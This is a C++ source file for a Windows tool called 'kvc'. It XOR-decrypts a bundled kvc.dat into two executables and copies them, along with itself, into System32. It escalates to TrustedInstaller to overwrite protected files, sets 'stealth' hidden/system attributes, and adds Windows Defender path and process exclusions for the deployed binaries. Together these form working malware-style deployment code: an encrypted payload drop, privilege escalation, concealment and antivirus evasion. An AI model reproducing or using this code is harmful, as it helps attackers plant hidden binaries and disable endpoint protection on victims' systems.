// ControllerBinaryManager.cpp - Binary component extraction and deployment with privilege escalation

#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include "TrustedInstallerIntegrator.h"
#include <filesystem>

namespace fs = std::filesystem;

// Writes file with automatic privilege escalation if normal write fails
bool Controller::WriteFileWithPrivileges(const std::wstring& filePath, const std::vector<BYTE>& data) noexcept
{
    // First attempt: normal write operation
    if (Utils::WriteFile(filePath, data)) {
        return true;
    }
    
    // If normal write fails, check if file exists and handle system files
    const DWORD attrs = GetFileAttributesW(filePath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        INFO(L"Target file exists, attempting privileged overwrite: %s", filePath.c_str());
        
        // Clear restrictive attributes first
        if (attrs & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
            SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
        }
        
        // Try to delete with normal privileges first
        if (!DeleteFileW(filePath.c_str())) {
            // Fallback: Use TrustedInstaller for system-protected files
            INFO(L"Normal delete failed, escalating to TrustedInstaller");
            if (!m_trustedInstaller.DeleteFileAsTrustedInstaller(filePath)) {
                ERROR(L"Failed to delete existing file with TrustedInstaller: %s", filePath.c_str());
                return false;
            }
        }
    }
    
    // Retry normal write after cleanup
    if (Utils::WriteFile(filePath, data)) {
        return true;
    }
    
    // Final fallback: write directly with TrustedInstaller privileges
    INFO(L"Using TrustedInstaller to write file to protected location");
    if (!m_trustedInstaller.WriteFileAsTrustedInstaller(filePath, data)) {
        ERROR(L"TrustedInstaller write operation failed for: %s", filePath.c_str());
        return false;
    }
    
    return true;
}

// Enhanced file writing with TrustedInstaller privileges and proper overwrite handling
bool Controller::WriteExtractedComponents(const std::vector<BYTE>& kvcPassData, 
                                         const std::vector<BYTE>& kvcCryptData) noexcept
{
    INFO(L"Writing extracted components to target locations");
    
    try {
        wchar_t systemDir[MAX_PATH];
        if (GetSystemDirectoryW(systemDir, MAX_PATH) == 0) {
            ERROR(L"Failed to get System32 directory path");
            return false;
        }
        
        const fs::path system32Dir = systemDir;
        const fs::path kvcPassPath = system32Dir / KVC_PASS_FILE;
        const fs::path kvcCryptPath = system32Dir / KVC_CRYPT_FILE;
        const fs::path kvcMainPath = system32Dir / L"kvc.exe";
        
        INFO(L"Target paths - kvc_pass.exe: %s", kvcPassPath.c_str());
        INFO(L"Target paths - kvc_crypt.dll: %s", kvcCryptPath.c_str());
        INFO(L"Target paths - kvc.exe: %s", kvcMainPath.c_str());
        
        // Get current executable path for self-copy
        wchar_t currentExePath[MAX_PATH];
        if (GetModuleFileNameW(nullptr, currentExePath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current executable path");
            return false;
        }
        
        auto currentExeData = Utils::ReadFile(currentExePath);
        if (currentExeData.empty()) {
            ERROR(L"Failed to read current executable for self-copy");
            return false;
        }
        
        // Write all components using enhanced method with privilege escalation
        bool allSuccess = true;
        
        // Write kvc_pass.exe
        if (!WriteFileWithPrivileges(kvcPassPath.wstring(), kvcPassData)) {
            ERROR(L"Failed to write kvc_pass.exe to System32 directory");
            allSuccess = false;
        } else {
            INFO(L"Successfully wrote kvc_pass.exe (%zu bytes)", kvcPassData.size());
        }
        
        // Write kvc_crypt.dll  
        if (!WriteFileWithPrivileges(kvcCryptPath.wstring(), kvcCryptData)) {
            ERROR(L"Failed to write kvc_crypt.dll to System32 directory");
            allSuccess = false;
            // Cleanup on partial failure
            DeleteFileW(kvcPassPath.c_str());
        } else {
            INFO(L"Successfully wrote kvc_crypt.dll (%zu bytes)", kvcCryptData.size());
        }
        
        // Write kvc.exe (self-copy)
        if (!WriteFileWithPrivileges(kvcMainPath.wstring(), currentExeData)) {
            ERROR(L"Failed to write kvc.exe to System32 directory");
            allSuccess = false;
            // Cleanup on partial failure
            DeleteFileW(kvcPassPath.c_str());
            DeleteFileW(kvcCryptPath.c_str());
        } else {
            INFO(L"Successfully wrote kvc.exe (%zu bytes)", currentExeData.size());
        }
        
        if (!allSuccess) {
            return false;
        }
        
        // Set stealth attributes for all files
        const DWORD stealthAttribs = FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN;
        
        SetFileAttributesW(kvcPassPath.c_str(), stealthAttribs);
        SetFileAttributesW(kvcCryptPath.c_str(), stealthAttribs);
        SetFileAttributesW(kvcMainPath.c_str(), stealthAttribs);
        
        // Add Windows Defender exclusions for deployed components
        INFO(L"Adding Windows Defender exclusions for deployed components");

        // Add paths (all files)
        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcPassPath.wstring());
        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcCryptPath.wstring());
        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcMainPath.wstring());

        // Add processes (executables only)
        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc_pass.exe");
        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc.exe");

        INFO(L"Windows Defender exclusions configured successfully");
        
        INFO(L"Binary component extraction and deployment completed successfully");
        return true;
        
    } catch (const std::exception& e) {
        ERROR(L"Exception during component writing: %S", e.what());
        return false;
    } catch (...) {
        ERROR(L"Unknown exception during component writing");
        return false;
    }
}

// Main entry point for kvc.dat processing - decrypt and extract components
bool Controller::LoadAndSplitCombinedBinaries() noexcept 
{
    INFO(L"Starting kvc.dat processing - loading combined encrypted binary");
    
    try {
        const fs::path currentDir = fs::current_path();
        const fs::path kvcDataPath = currentDir / KVC_DATA_FILE;
        
        if (!fs::exists(kvcDataPath)) {
            ERROR(L"kvc.dat file not found in current directory: %s", kvcDataPath.c_str());
            return false;
        }
        
        auto encryptedData = Utils::ReadFile(kvcDataPath.wstring());
        if (encryptedData.empty()) {
            ERROR(L"Failed to read kvc.dat file or file is empty");
            return false;
        }
        
        INFO(L"Successfully loaded kvc.dat (%zu bytes)", encryptedData.size());
        
        // Decrypt using XOR cipher with predefined key
        auto decryptedData = Utils::DecryptXOR(encryptedData, KVC_XOR_KEY);
        if (decryptedData.empty()) {
            ERROR(L"XOR decryption failed - invalid encrypted data");
            return false;
        }

        INFO(L"XOR decryption completed successfully");

        // Split combined binary into separate PE components
        std::vector<BYTE> kvcPassData, kvcCryptData;
        if (!Utils::SplitCombinedPE(decryptedData, kvcPassData, kvcCryptData)) {
            ERROR(L"Failed to split combined PE data into components");
            return false;
        }

        if (kvcPassData.empty() || kvcCryptData.empty()) {
            ERROR(L"Extracted components are empty - invalid PE structure");
            return false;
        }
        
        INFO(L"PE splitting successful - kvc_pass.exe: %zu bytes, kvc_crypt.dll: %zu bytes", 
             kvcPassData.size(), kvcCryptData.size());
        
        // Write extracted components with enhanced error handling
        if (!WriteExtractedComponents(kvcPassData, kvcCryptData)) {
            ERROR(L"Failed to write extracted binary components to disk");
            return false;
        }
        
        INFO(L"kvc.dat processing completed successfully");
        return true;
        
    } catch (const std::exception& e) {
        ERROR(L"Exception during kvc.dat processing: %S", e.what());
        return false;
    } catch (...) {
        ERROR(L"Unknown exception during kvc.dat processing");
        return false;
    }
}